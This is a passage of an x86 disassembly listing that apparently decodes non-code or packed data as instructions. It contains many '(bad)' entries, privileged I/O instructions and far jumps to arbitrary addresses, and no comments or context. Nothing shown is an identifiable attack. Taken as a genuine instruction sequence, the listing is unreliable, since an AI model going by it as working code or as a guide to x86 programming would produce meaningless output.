  423614:	xor    ebx,DWORD PTR [ecx]
  423616:	test   esi,esi
  423618:	jno    0x42362f
  42361a:	ins    DWORD PTR es:[edi],dx
  42361b:	ja     0x42369a
  42361d:	test   BYTE PTR [eax+0x70],al
  423620:	pop    ds
  423621:	std    
  423622:	cmp    ecx,edx
  423624:	inc    eax
  423625:	ficomp WORD PTR [edx+0x27]
  423628:	shr    BYTE PTR [ecx+0x19],1
  42362b:	idiv   DWORD PTR [eax-0x17d8dd4f]
  423631:	mov    ch,0x98
  423633:	jmp    0xc981:0x7c05b80c
  42363a:	xchg   edx,eax
  42363b:	hlt    
  42363c:	in     eax,0xbd
  42363e:	or     BYTE PTR [edx+ebp*1+0x38],ah
  423642:	loope  0x4235cd
  423644:	pop    ebp
  423645:	pop    ebp
  423646:	aad    0x91
  423648:	mov    dl,0x1e
  42364a:	loop   0x42361b
  42364c:	dec    esp
  42364d:	xchg   esi,eax
  42364e:	or     eax,0x9aa79e44
  423653:	sar    DWORD PTR [edi+ebx*8],cl
  423656:	sahf   
  423657:	ret    0x858a
  42365a:	push   edx
  42365b:	sbb    al,0x37
  42365d:	iret   
  42365e:	ja     0x423659
  423660:	lods   al,BYTE PTR ds:[esi]
  423661:	cmp    esp,DWORD PTR [esp+ebp*8]
  423664:	jne    0x4235fc
  423666:	xchg   edx,eax
  423667:	aad    0xa7
  423669:	loopne 0x423608
  42366b:	gs pop fs
  42366e:	jge    0x423688
  423670:	test   al,0x4
  423672:	jmp    0x4236a0
  423674:	xchg   BYTE PTR [esp+eiz*8-0x64138e8e],dl
  42367b:	mov    dl,BYTE PTR [eax+0x437eafec]
  423681:	adc    esp,esi
  423683:	mov    BYTE PTR [eax-0x486f6875],0xf2
  42368a:	fnstenv [ecx]
  42368c:	or     eax,DWORD PTR [edx]
  42368e:	inc    esp
  42368f:	aam    0xab
  423691:	lods   eax,DWORD PTR ds:[esi]
  423692:	jl     0x4236f9
  423694:	fld    DWORD PTR [edi+0x67]
  423697:	std    
  423698:	xchg   edi,eax
  423699:	outs   dx,DWORD PTR ds:[esi]
  42369a:	dec    ebx
  42369b:	lock push ebx
  42369d:	aaa    
  42369e:	aam    0xad
  4236a0:	and    ebp,DWORD PTR [edi-0x12a05710]
  4236a6:	rcl    BYTE PTR [edx],cl
  4236a8:	sbb    al,0x16
  4236aa:	fisttp WORD PTR [eax]
  4236ac:	fidivr DWORD PTR [ecx+0x67]
  4236af:	retf   
  4236b0:	out    0x35,eax
  4236b2:	cmp    bh,BYTE PTR [eax]
  4236b4:	dec    esi
  4236b5:	cwde   
  4236b6:	mov    esi,0x5766a8b0
  4236bb:	int3   
  4236bc:	and    DWORD PTR [eax],eax
  4236be:	adc    cl,0xc6
  4236c1:	outs   dx,BYTE PTR ds:[esi]
  4236c2:	pop    ebx
  4236c3:	xchg   esi,eax
  4236c4:	push   ebp
  4236c5:	pop    edx
  4236c6:	fdivr  DWORD PTR [eax]
  4236c8:	or     BYTE PTR [ecx-0x364fa4f9],bl
  4236ce:	jecxz  0x423652
  4236d0:	push   0x7f3f47f7
  4236d5:	dec    edi
  4236d6:	dec    BYTE PTR [ebx+0xf]
  4236d9:	(bad)  
  4236da:	xor    ecx,edi
  4236dc:	adc    DWORD PTR [esi-0x320ac47c],edi
  4236e2:	cmp    ebp,ecx
  4236e4:	xchg   ecx,eax
  4236e5:	ja     0x423718
  4236e7:	mov    WORD PTR [ebp+0x17],?
  4236ea:	shl    DWORD PTR [ebp+ebp*8+0x37b6a83c],1
  4236f1:	bound  esp,QWORD PTR [edx]
  4236f3:	into   
  4236f4:	mov    bl,0xe
  4236f6:	fldenv [esi+0xe26cc9d]
  4236fc:	jae    0x423756
  4236fe:	dec    esp
  4236ff:	sbb    DWORD PTR [edx-0x70c0b56a],esp
  423705:	sbb    DWORD PTR [edx+0x7ac0eb9],0x6c38c9d4
  42370f:	pop    ebx
  423710:	xchg   ecx,eax
  423711:	adc    DWORD PTR [eax+0x2c],edi
  423714:	outs   dx,DWORD PTR ds:[esi]
  423715:	dec    edi
  423716:	xor    ah,ah
  423718:	ret    
  423719:	cmp    DWORD PTR [ecx-0x44],0x5e
  42371d:	test   BYTE PTR [eax],al
  42371f:	repz jnp 0x42379f
  423722:	adc    DWORD PTR [edi+ecx*4],0xad80268d
  423729:	mov    al,ds:0x4c26ea8f
  42372e:	mov    WORD PTR [edi+edi*8+0x19],fs
  423732:	add    DWORD PTR [ebx-0x4a],ebp
  423735:	xchg   DWORD PTR [esi+0x10],esi
  423738:	jle    0x42378b
  42373a:	pop    edx
  42373b:	mov    ah,0x2f
  42373d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42373e:	lods   eax,DWORD PTR ds:[esi]
  42373f:	pop    ebp
  423740:	arpl   WORD PTR [esi-0x74b6534e],dx
  423746:	arpl   WORD PTR [edi],di
  423748:	out    dx,eax
  423749:	push   ecx
  42374a:	jmp    0x39854451
  42374f:	sbb    BYTE PTR [edx+0x24],dh
  423752:	dec    ebp
  423753:	cmp    BYTE PTR [eax],dl
  423755:	dec    BYTE PTR [edx*2-0x3c39120]
  42375c:	pop    esp
  42375d:	in     al,0xa4
  42375f:	call   0x66b72c5c
  423764:	imul   ecx,DWORD PTR [edx+edi*8-0x404a3455],0x5bbf3ddd
  42376f:	into   
  423770:	je     0x423795
  423772:	inc    edx
  423773:	int3   
  423774:	sbb    ebx,ebp
  423776:	int    0xb2
  423778:	jg     0x4237ab
  42377a:	cmp    BYTE PTR [ecx],dl
  42377c:	ror    DWORD PTR [esi],1
  42377e:	add    al,0x4d
  423780:	call   0x86e2:0x607de739
  423787:	and    cl,BYTE PTR [edi+0x566ae9d]
  42378d:	gs sub dl,al
  423790:	xchg   ecx,eax
  423791:	loopne 0x4237c8
  423793:	mov    dh,0xfe
  423795:	and    BYTE PTR [edi-0x7e49062c],cl
  42379b:	cmp    BYTE PTR [esi],ch
  42379d:	retf   0x621
  4237a0:	clc    
  4237a1:	xor    BYTE PTR [edi+0x6b],cl
  4237a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237a5:	shl    DWORD PTR [ecx+edx*8+0x66],0xea
  4237aa:	gs cdq 
  4237ac:	and    edi,eax
  4237ae:	jbe    0x42382c
  4237b0:	leave  
  4237b1:	loop   0x42382f
  4237b3:	inc    esp
  4237b4:	jmp    0x7ddd:0xca4a8d3b
  4237bb:	and    al,cl
  4237bd:	(bad)  
  4237be:	das    
  4237bf:	sar    DWORD PTR [esi+0x36],0x6b
  4237c3:	clc    
  4237c4:	mov    ah,0xef
  4237c6:	jnp    0x4237ed
  4237c8:	inc    ebp
  4237c9:	jl     0x4237ba
  4237cb:	rcl    edi,0xb3
  4237ce:	aaa    
  4237cf:	mov    ebp,DWORD PTR [edi-0x5d]
  4237d2:	rcl    dl,1
  4237d4:	jl     0x423843
  4237d6:	mov    al,ds:0x50c2e37b
  4237db:	jle    0x4237ae
  4237dd:	mov    esi,0xbad21439
  4237e2:	fiadd  DWORD PTR [ecx-0x183dd5ae]
  4237e8:	inc    ebx
  4237e9:	inc    ebx
  4237ea:	fisttp DWORD PTR ds:0x54f6313c
  4237f0:	mov    edi,0x1864e50e
  4237f5:	js     0x423812
  4237f7:	gs imul ecx,edi,0x1c
  4237fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237fc:	xor    al,0x5a
  4237fe:	mov    eax,ds:0xf0400501
  423803:	or     al,0x1d
  423805:	out    0xd8,eax
  423807:	jno    0x423846
  423809:	pop    edi
  42380a:	mov    bl,0xc2
  42380c:	int3   
  42380d:	enter  0xb268,0x36
  423811:	jle    0x423826
  423813:	and    esp,esi
  423815:	push   ebx
  423816:	das    
  423817:	lahf   
  423818:	test   BYTE PTR [ecx+0x16],ah
  42381b:	mov    fs,WORD PTR [ebx+0x32]
  42381e:	pop    esp
  42381f:	(bad)  
  423820:	pushf  
  423821:	or     BYTE PTR [ebx+0x3ac54064],al
  423827:	sbb    eax,0x2230c44b
  42382c:	sub    al,BYTE PTR ds:0x413cfa73
  423832:	fs add esp,esp
  423835:	inc    edi
  423836:	retf   
  423837:	rcl    BYTE PTR [ebx+0x6a416824],cl
  42383d:	jns    0x42384d
  42383f:	imul   ebp,ebx,0x38471b6
  423845:	stc    
  423846:	and    DWORD PTR [ebx-0x1322ccab],ebp
  42384c:	pop    ds
  42384d:	jb     0x423872
  42384f:	in     eax,dx
  423850:	in     eax,0x2e
  423852:	push   cs
  423853:	jecxz  0x423853
  423855:	test   al,0x9b
  423857:	(bad)  
  423858:	push   0xfffffff2
  42385a:	sub    DWORD PTR [ebx],eax
  42385c:	xchg   DWORD PTR [eax+ecx*8+0x5a],esp
  423860:	sahf   
  423861:	adc    esp,DWORD PTR [ebp-0x705fbda3]
  423867:	jns    0x423825
  423869:	pop    edx
  42386a:	xchg   BYTE PTR [eax-0x62],ch
  42386d:	int    0xb8
  42386f:	mov    dh,0x8f
  423871:	std    
  423872:	sub    bh,BYTE PTR [ecx+esi*4]
  423875:	cmc    
  423876:	sti    
  423877:	ja     0x423872
  423879:	push   ebp
  42387a:	add    eax,0xa10fccb5
  42387f:	call   0x9ff57ae3
  423884:	add    esi,eax
  423886:	sbb    eax,0xf05b06d0
  42388b:	imul   esi,DWORD PTR [edi+0x1d],0xa9034670
  423892:	inc    ebp
  423893:	and    ch,BYTE PTR [esi*8-0x6558521d]
  42389a:	jmp    0x6d6b:0x40c015a
  4238a1:	mov    WORD PTR [ebp-0x5bd14132],ss
  4238a7:	rol    DWORD PTR cs:[ebx+edi*1-0x1f473131],cl
  4238af:	scas   al,BYTE PTR es:[edi]
  4238b0:	jge    0x42389c
  4238b2:	dec    ecx
  4238b3:	jle    0x4238fc
  4238b5:	outs   dx,BYTE PTR ds:[esi]
  4238b6:	pop    edi
  4238b7:	leave  
  4238b8:	pop    ecx
  4238b9:	xchg   edi,eax
  4238ba:	sbb    dh,ch
  4238bc:	ret    
  4238bd:	cmc    
  4238be:	mov    ebx,0xa09a571
  4238c3:	lds    eax,FWORD PTR [eax+0x79741907]
  4238c9:	push   0xffffffde
  4238cb:	mov    bl,0x88
  4238cd:	jns    0x423905
  4238cf:	cmp    DWORD PTR [edx+0x370bc9cb],edi
  4238d5:	jp     0x4238d9
  4238d7:	out    dx,eax
  4238d8:	cmp    ch,BYTE PTR [esi+edi*8-0x29fea8d8]
  4238df:	dec    ecx
  4238e0:	inc    edi
  4238e1:	ficom  WORD PTR [eax]
  4238e3:	loope  0x4238a8
  4238e5:	pop    edx
  4238e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238e7:	push   edi
  4238e8:	xchg   esi,eax
  4238e9:	iret   
  4238ea:	(bad)  
  4238ec:	jmp    0xf77d3a67
  4238f1:	push   ss
  4238f2:	cdq    
  4238f3:	nop
  4238f4:	sbb    ah,ch
  4238f6:	mov    edx,0x5a4cac89
  4238fb:	dec    ecx
  4238fc:	nop
  4238fd:	add    DWORD PTR [esi-0x2683604a],edi
  423903:	add    ah,dh
  423905:	rcl    BYTE PTR [eax+0x700143bf],cl
  42390b:	lods   eax,DWORD PTR ds:[esi]
  42390c:	xchg   ebp,eax
  42390d:	add    al,0x14
  42390f:	in     eax,0x8f
  423911:	loop   0x4238c1
  423913:	jecxz  0x42391b
  423915:	repnz repnz div BYTE PTR [edi-0x5d]
  42391a:	dec    ebp
  42391b:	and    bh,BYTE PTR [ecx-0x3238445]
  423921:	ror    BYTE PTR [esi-0x165af7de],1
  423927:	in     eax,dx
  423928:	mov    ds:0x6e10b857,al
  42392d:	add    bl,BYTE PTR [edi-0x5c]
  423930:	and    DWORD PTR [esi],edi
  423932:	and    DWORD PTR [esi+ebx*1],0xbb41606e
  423939:	lock jmp DWORD PTR [ebx]
  42393c:	add    DWORD PTR [esi+0x21],esi
  42393f:	mov    bh,0x9c
  423941:	fistp  WORD PTR [edi]
  423943:	fwait
  423944:	push   ss
  423945:	in     al,dx
  423946:	xor    BYTE PTR [ecx+0x95faa6e],ch
  42394c:	mov    ch,0x5c
  42394e:	and    BYTE PTR [edi+0x12],bh
  423951:	pop    edx
  423952:	jl     0x423913
  423954:	dec    ebx
  423955:	mul    BYTE PTR [ecx-0x42a2c9cf]
  42395b:	inc    esp
  42395c:	outs   dx,BYTE PTR gs:[esi]
  42395e:	rol    BYTE PTR [ebx],0x8f
  423961:	out    dx,al
  423962:	adc    eax,0x5dc55d9b
  423967:	mov    ch,0xcc
  423969:	cwde   
  42396a:	arpl   di,ax
  42396c:	scas   al,BYTE PTR es:[edi]
  42396d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42396e:	jle    0x42399b
  423970:	nop
  423971:	xor    BYTE PTR [ecx],0x85
  423974:	retf   0x8061
  423977:	ror    DWORD PTR [edi+0x7676aa9b],cl
  42397d:	inc    edi
  42397e:	hlt    
  42397f:	pushf  
  423980:	xchg   esi,eax
  423981:	ds jmp 0xa2a7:0xb2db9e60
  423989:	sbb    al,0x39
  42398b:	adc    DWORD PTR [ecx-0x6f],ebx
  42398e:	aad    0xb2
  423990:	xchg   esi,eax
  423991:	pop    ebp
  423992:	loop   0x4239bc
  423994:	(bad)  
  423995:	and    ebp,DWORD PTR [ebp-0x3b]
  423998:	cmp    BYTE PTR [edx+0x2d],bl
  42399b:	pop    ss
  42399c:	adc    dh,BYTE PTR [edi]
  42399e:	shl    DWORD PTR [esi-0x1e9134ca],0x3d
  4239a5:	out    dx,eax
  4239a6:	adc    esi,DWORD PTR [ebp-0x632cfe5d]
  4239ac:	sar    DWORD PTR [eax-0x52b5060c],0x83
  4239b3:	leave  
  4239b4:	and    DWORD PTR [di],ebp
  4239b7:	les    eax,FWORD PTR [ebx]
  4239b9:	aaa    
  4239ba:	dec    edi
  4239bb:	or     DWORD PTR [ebp-0xa],esp
  4239be:	pop    ds
  4239bf:	ret    0x4708
  4239c2:	pop    ds
  4239c3:	add    ebp,0xffffffb5
  4239c6:	cmp    eax,0x44e9e235
  4239cb:	out    dx,al
  4239cc:	pop    edx
  4239cd:	jp     0x4239a8
  4239cf:	mov    DWORD PTR [ebx-0x38271491],ebp
  4239d5:	cmc    
  4239d6:	push   ebp
  4239d7:	xchg   esi,eax
  4239d8:	add    dl,bl
  4239da:	iret   
  4239db:	pop    ss
  4239dc:	push   edi
  4239de:	push   ds
  4239df:	xor    DWORD PTR [edi-0x17],ebx
  4239e2:	xchg   esi,eax
  4239e3:	scas   al,BYTE PTR es:[edi]
  4239e4:	jmp    0xdb02:0x163ec89f
  4239eb:	xchg   DWORD PTR [eax+0x1623283f],eax
  4239f1:	or     esp,DWORD PTR [edx]
  4239f3:	cmp    BYTE PTR [esi+0x62],cl
  4239f6:	pop    ebp
  4239f7:	mov    ds:0x2406572,al
  4239fc:	push   es
  4239fd:	cli    
  4239fe:	data16 (bad) 
  423a00:	(bad)  
  423a01:	call   DWORD PTR [ebx+0x68432a54]
  423a07:	cmp    ecx,esi
  423a09:	dec    esp
  423a0a:	xchg   esi,eax
  423a0b:	scas   al,BYTE PTR es:[edi]
  423a0c:	in     al,dx
  423a0d:	sar    ebp,1
  423a0f:	bound  ebp,QWORD PTR [ebx]
  423a11:	inc    ebx
  423a12:	adc    al,0x92
  423a14:	aam    0x5c
  423a16:	push   edx
  423a17:	and    ah,BYTE PTR [eax+0x5a8ae652]
  423a1d:	shl    BYTE PTR [ebp+0x19],cl
  423a20:	pop    esi
  423a21:	mov    DWORD PTR [ebx],edx
  423a23:	cmp    eax,0x5198ba8d
  423a28:	dec    esi
  423a29:	les    ebp,FWORD PTR [esi]
  423a2b:	cmp    esp,DWORD PTR [ebx+eiz*1]
  423a2e:	xor    edi,DWORD PTR [esi-0x617fc115]
  423a34:	xchg   BYTE PTR [ebp-0x49],ch
  423a37:	cmp    edx,DWORD PTR [edx+0x1595252a]
  423a3d:	sub    bl,ch
  423a3f:	push   edi
  423a40:	mov    esi,db7
  423a43:	test   eax,0xd5018962
  423a48:	test   DWORD PTR [edx],esi
  423a4a:	sbb    ah,BYTE PTR [ecx-0x42]
  423a4d:	and    BYTE PTR ds:0x368630db,ch
  423a53:	neg    ebx
  423a55:	popf   
  423a56:	inc    edx
  423a57:	sbb    DWORD PTR [ecx+ebp*1],esp
  423a5a:	cmp    DWORD PTR [esi-0x5073c88],edi
  423a60:	jmp    0x14a4:0xa89c56dd
  423a67:	jge    0x423a8f
  423a69:	sti    
  423a6a:	test   DWORD PTR [eax+0x44],0x37a3797a
  423a71:	add    al,0xd2
  423a73:	add    esi,DWORD PTR [ebx+0x7f76a5cc]
  423a79:	daa    
  423a7a:	stc    
  423a7b:	out    dx,al
  423a7c:	fiadd  DWORD PTR [ebx-0x3895e440]
  423a82:	add    BYTE PTR [ebx],al
  423a84:	mov    ecx,0x1ffc0be0
  423a89:	aam    0x6
  423a8b:	(bad)  
  423a8c:	call   0x233b:0xbeb477a8
  423a93:	outs   dx,BYTE PTR ds:[esi]
  423a94:	jge    0x423a9b
  423a96:	in     al,0x97
  423a98:	xchg   ebx,eax
  423a99:	mov    edi,0x6ab54b92
  423a9e:	add    DWORD PTR [edx-0x75],0xffffffca
  423aa2:	clc    
  423aa3:	xor    al,0x22
  423aa5:	and    al,0xa0
  423aa7:	test   BYTE PTR [eax+0x7],dh
  423aaa:	dec    esi
  423aab:	add    eax,0x3610541e
  423ab0:	popa   
  423ab1:	aam    0xdb
  423ab3:	xchg   BYTE PTR [esp+esi*1-0x1],dh
  423ab7:	pop    ebx
  423ab8:	(bad)  
  423ab9:	pop    esi
  423aba:	or     DWORD PTR [ebp-0xd6b2675],ebx
  423ac0:	mov    cs,edx
  423ac2:	in     eax,0x78
  423ac4:	ss ds stos BYTE PTR es:[edi],al
  423ac7:	jno    0x423a92
  423ac9:	cmp    DWORD PTR [eax+0x63],0x850ad8dc
  423ad0:	out    dx,al
  423ad1:	inc    esp
  423ad2:	sbb    eax,0x687364bb
  423ad7:	jp     0x423b03
  423ad9:	add    eax,DWORD PTR [edi]
  423adb:	(bad)  
  423adc:	adc    al,BYTE PTR [edx+0x42]
  423adf:	push   ds
  423ae0:	jle    0x423b5d
  423ae2:	(bad)  
  423ae3:	enter  0x961,0xba
  423ae7:	mov    bl,0x28
  423ae9:	fnstsw WORD PTR [ecx+ebx*8]
  423aec:	push   esi
  423aed:	xor    BYTE PTR [ecx*4-0x595dbe6a],0xe8
  423af5:	or     BYTE PTR [ebx+0x308e953c],al
  423afb:	outs   dx,BYTE PTR ds:[esi]
  423afc:	pop    edx
  423afd:	enter  0x24eb,0x9a
  423b01:	add    bh,0x4b
  423b04:	das    
  423b05:	out    0xe3,eax
  423b07:	dec    ebx
  423b08:	pop    esp
  423b09:	or     BYTE PTR [ebx-0x6cde1619],ah
  423b0f:	(bad)  
  423b10:	pushf  
  423b11:	sahf   
  423b12:	out    0x1b,al
  423b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b15:	imul   eax,ebx,0xffffffea
  423b18:	imul   ebp,DWORD PTR [ecx-0x34],0xffffffe9
  423b1c:	push   eax
  423b1d:	adc    bh,bh
  423b1f:	lods   al,BYTE PTR ds:[esi]
  423b20:	pop    ebp
  423b21:	dec    edi
  423b22:	mov    ebp,0x69bd6d88
  423b27:	es push edi
  423b29:	shr    BYTE PTR [ebx],cl
  423b2b:	lods   eax,DWORD PTR ds:[esi]
  423b2c:	xor    ecx,DWORD PTR [edx]
  423b2e:	mov    esi,ecx
  423b30:	jo     0x423acd
  423b32:	dec    ecx
  423b33:	out    dx,eax
  423b34:	sbb    al,0xb
  423b36:	adc    esp,edx
  423b38:	xchg   DWORD PTR [esi-0x7a18044a],edi
  423b3e:	std    
  423b3f:	ins    BYTE PTR es:[edi],dx
  423b40:	dec    edi
  423b41:	test   eax,0x1c9ea20c
  423b46:	jmp    0x7452:0x3c92ff31
  423b4d:	ficomp WORD PTR [ebx-0x27]
  423b50:	out    dx,al
  423b51:	jl     0x423adb
  423b53:	and    DWORD PTR [esi+edi*8-0x666b98f6],eax
  423b5a:	push   es
  423b5b:	popf   
  423b5c:	(bad)  [edi]
  423b5e:	xchg   ebp,eax
  423b5f:	jo     0x423b57
  423b61:	dec    ecx
  423b62:	int    0xbc
  423b64:	push   edi
  423b65:	jmp    0x423af0
  423b67:	mul    BYTE PTR [eax+0x1dd24587]
  423b6d:	xchg   esi,eax
  423b6e:	bswap  ebx
  423b70:	inc    esp
  423b71:	jnp    0x423bb6
  423b73:	lods   eax,DWORD PTR ds:[esi]
  423b74:	push   ebx
  423b75:	gs add esp,esi
  423b78:	imul   ebp,DWORD PTR [esi],0x88990b1c
  423b7e:	mov    eax,0xa6985d73
  423b83:	mov    ds:0xd045042b,al
  423b88:	mov    DWORD PTR [ebx+0x2e],ebp
  423b8b:	adc    eax,0x30072f54
  423b90:	into   
  423b91:	scas   al,BYTE PTR es:[edi]
  423b92:	mov    eax,ds:0x7436fbce
  423b97:	ins    DWORD PTR es:[edi],dx
  423b98:	loop   0x423bf5
  423b9a:	xor    ecx,DWORD PTR [edx]
  423b9c:	xchg   ebp,eax
  423b9d:	ins    DWORD PTR es:[edi],dx
  423b9e:	push   edx
  423b9f:	mov    ebp,0xf3e5ad3a
  423ba4:	cli    
  423ba5:	mov    bl,0x5
  423ba7:	dec    eax
  423ba8:	cmp    ebx,DWORD PTR [ebx-0x4e]
  423bab:	jo     0x423b3c
  423bad:	rol    DWORD PTR fs:[edi+esi*2-0x32f5229d],1
  423bb5:	mov    ah,0x59
  423bb7:	xor    eax,0xda1f8ac7
  423bbc:	jns    0x423b66
  423bbe:	push   edi
  423bbf:	cmp    ecx,DWORD PTR [ebx-0x77366dc6]
  423bc5:	in     al,0x41
  423bc7:	aam    0x7d
  423bc9:	outs   dx,DWORD PTR ds:[esi]
  423bca:	dec    edx
  423bcb:	xchg   BYTE PTR [esi-0x29],ah
  423bce:	pop    ss
  423bcf:	mov    edi,0xa25a2e8d
  423bd4:	pop    ebp
  423bd5:	inc    ebp
  423bd6:	out    dx,eax
  423bd7:	and    al,0xc6
  423bd9:	fild   QWORD PTR [eax]
  423bdb:	or     al,0x1f
  423bdd:	xor    eax,eax
  423bdf:	pop    es
  423be0:	imul   eax,DWORD PTR [ecx-0x1],0xffffff8d
  423be4:	inc    BYTE PTR [eax+0x56]
  423be7:	xor    cl,al
  423be9:	xor    al,0xc0
  423beb:	dec    ecx
  423bec:	xor    dl,BYTE PTR [edi]
  423bee:	(bad)  
  423bef:	jp     0x423bb2
  423bf1:	mov    edx,0x49398d8b
  423bf6:	or     edi,DWORD PTR [ebx]
  423bf8:	(bad)  
  423bf9:	scas   eax,DWORD PTR es:[edi]
  423bfa:	ja     0x423bb4
  423bfc:	fisubr WORD PTR [ebp-0x79842558]
  423c02:	jge    0x423c7f
  423c04:	pushf  
  423c05:	jmp    FWORD PTR [ecx]
  423c07:	shr    BYTE PTR [ecx],0x34
  423c0a:	sub    ebp,ebx
  423c0c:	cli    
  423c0d:	xor    BYTE PTR [edi-0x57],ch
  423c10:	stc    
  423c11:	je     0x423bee
  423c13:	(bad)  
  423c14:	call   DWORD PTR [ecx]
  423c16:	mov    dl,0xad
  423c18:	inc    edi
  423c19:	xor    al,0xa0
  423c1b:	push   ss
  423c1c:	mov    ebp,0xb628f0ba
  423c21:	cmp    ebp,DWORD PTR [edx]
  423c23:	add    eax,0xf33aefcc
  423c28:	lea    esi,[edx+eiz*8-0xbef8da]
  423c2f:	cwde   
  423c30:	nop
  423c31:	mov    ch,0x91
  423c33:	daa    
  423c34:	cmp    eax,0x34d29078
  423c39:	iret   
  423c3a:	dec    ecx
  423c3b:	in     al,0x2e
  423c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c3e:	fnsave [ecx+0x646a4867]
  423c44:	xchg   esp,eax
  423c45:	lods   eax,DWORD PTR ds:[esi]
  423c46:	aad    0xf7
  423c48:	shr    DWORD PTR [edi-0x2b93f490],1
  423c4e:	cs jb  0x423c58
  423c51:	retf   0x80b
  423c54:	mov    dl,dh
  423c56:	ret    
  423c57:	jecxz  0x423c48
  423c59:	xchg   esp,eax
  423c5a:	add    al,0xc4
  423c5c:	sbb    eax,0x92bedc65
  423c61:	shl    DWORD PTR gs:[edx-0x65a92e0c],0xc9
  423c69:	or     eax,0x49e184fd
  423c6e:	pushf  
  423c6f:	mov    al,ds:0x35d5e79c
  423c74:	mov    esp,0xd8be8e36
  423c79:	pop    eax
  423c7a:	push   cs
  423c7b:	fst    QWORD PTR [ecx-0x5ffbe9d]
  423c81:	adc    DWORD PTR [edx+0x476a7e67],esp
  423c87:	xor    esi,DWORD PTR [ebp+0x24]
  423c8a:	mov    ?,esp
  423c8c:	shl    DWORD PTR [edx+0xffdcbcc],cl
  423c92:	pop    edi
  423c93:	push   0x7d
  423c95:	xchg   ebx,eax
  423c96:	mov    ecx,0x8dbd57b
  423c9b:	fisttp WORD PTR [ebx+0x24]
  423c9e:	inc    eax
  423c9f:	cld    
  423ca0:	fsub   DWORD PTR [ecx-0x71]
  423ca3:	cmp    BYTE PTR [ebp-0x16],bl
  423ca6:	sbb    eax,0x8721e107
  423cab:	push   edi
  423cac:	sbb    edi,ebx
  423cae:	jmp    0x7959:0x6b5b84e5
  423cb5:	loopne 0x423c43
  423cb7:	jo     0x423d0b
  423cb9:	push   ss
  423cba:	(bad)  
  423cbb:	daa    
  423cbc:	in     al,0xc
  423cbe:	xchg   ebx,eax
  423cbf:	xchg   esp,eax
  423cc0:	xor    edi,DWORD PTR [ebp+0x77e885de]
  423cc6:	in     al,0xc8
  423cc8:	jge    0x423c4c
  423cca:	imul   edi,DWORD PTR [ebx-0x43],0x3348042e
  423cd1:	fisttp WORD PTR [ecx+esi*4+0xf]
  423cd5:	aas    
  423cd6:	xor    DWORD PTR [ebp+0x1c85a3e6],ebx
  423cdc:	mov    ds:0xac921597,eax
  423ce1:	pop    es
  423ce2:	adc    al,0x8a
  423ce4:	aas    
  423ce5:	es call 0x4f67e1e3
  423ceb:	sbb    DWORD PTR [eax+0x32],edi
  423cee:	out    dx,al
  423cef:	or     ecx,DWORD PTR [ecx-0x7a]
  423cf2:	mov    edi,0x777bc3e
  423cf7:	cmc    
  423cf8:	fisub  WORD PTR [ecx]
  423cfa:	push   eax
  423cfb:	jbe    0x423d59
  423cfd:	inc    edi
  423cfe:	or     al,0x3a
  423d00:	sbb    BYTE PTR [edi],bh
  423d02:	iret   
  423d03:	adc    eax,0x58ae030a
  423d09:	and    bl,BYTE PTR [eax+0x3ebab629]
  423d0f:	mov    ecx,0x1af613bb
  423d14:	lock mov dl,0xf3
  423d17:	pop    ss
  423d18:	aad    0x11
  423d1a:	inc    ecx
  423d1b:	jmp    0x21d7acc8
  423d20:	popf   
  423d21:	mov    ecx,0x8828f600
  423d26:	or     dh,BYTE PTR [ecx]
  423d28:	lds    ecx,FWORD PTR [bx-0x68]
  423d2c:	aaa    
  423d2d:	xor    al,cl
  423d2f:	(bad)  
  423d30:	icebp  
  423d31:	mov    esi,0x3db3f8f5
  423d36:	pop    es
  423d37:	jecxz  0x423d25
  423d39:	imul   eax,DWORD PTR [eax],0x7cf611a1
  423d3f:	mov    edx,DWORD PTR [edi]
  423d41:	inc    eax
  423d42:	adc    al,0x8a
  423d44:	fcomp  QWORD PTR [esi+edx*4]
  423d47:	jo     0x423cf7
  423d49:	push   eax
  423d4a:	dec    ebp
  423d4b:	mov    dl,0xbc
  423d4d:	push   es
  423d4e:	dec    eax
  423d4f:	inc    edi
  423d50:	pop    ss
  423d51:	or     ah,bh
  423d53:	and    cl,0x48
  423d56:	cld    
  423d57:	mov    bh,cl
  423d59:	cmovb  ebp,esp
  423d5c:	(bad)  
  423d5d:	inc    eax
  423d5e:	test   BYTE PTR [esi],bh
  423d60:	nop
  423d61:	(bad)  
  423d62:	(bad)  
  423d63:	mov    ecx,0xf77e1d9e
  423d68:	jo     0x423d75
  423d6a:	sahf   
  423d6b:	xchg   BYTE PTR [ecx+edi*2+0x6bca42ee],dl
  423d72:	lods   eax,DWORD PTR ds:[esi]
  423d73:	inc    ebx
  423d74:	mov    ds:0x7f482b0b,al
  423d79:	scas   eax,DWORD PTR es:[edi]
  423d7a:	out    0x4d,al
  423d7c:	cdq    
  423d7d:	inc    esp
  423d7e:	jnp    0x423d31
  423d80:	xchg   ecx,eax
  423d81:	scas   eax,DWORD PTR es:[edi]
  423d82:	mov    eax,ds:0x15db14a9
  423d87:	cmp    ch,BYTE PTR ds:0x656ee411
  423d8d:	and    eax,0xf90b894a
  423d92:	retf   
  423d93:	retf   0xb4ab
  423d96:	imul   esp,DWORD PTR [edx-0x5a],0xffffffc9
  423d9a:	in     eax,0x40
  423d9c:	imul   edx,DWORD PTR [eax-0x6e0978b5],0xfffffff6
  423da3:	mov    bl,0x75
  423da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423da6:	(bad)  
  423da7:	into   
  423da8:	pop    es
  423da9:	pop    es
  423daa:	sub    dl,BYTE PTR [edx-0x21]
  423dad:	cmc    
  423dae:	or     eax,0x74ddc6e
  423db3:	jno    0x423e2b
  423db5:	bound  eax,QWORD PTR [ebp-0x7]
  423db8:	fcom   DWORD PTR [ecx+ecx*1]
  423dbb:	sub    DWORD PTR [ebx-0x44958657],edi
  423dc1:	aad    0x98
  423dc3:	inc    esi
  423dc4:	mov    bh,0x7c
  423dc6:	mov    WORD PTR [esi],ss
  423dc8:	ret    
  423dc9:	and    ch,ah
  423dcb:	cwde   
  423dcc:	mov    ecx,0xa7b105f1
  423dd1:	pop    eax
  423dd2:	aam    0x90
  423dd4:	mov    cl,0xb4
  423dd6:	repnz cli 
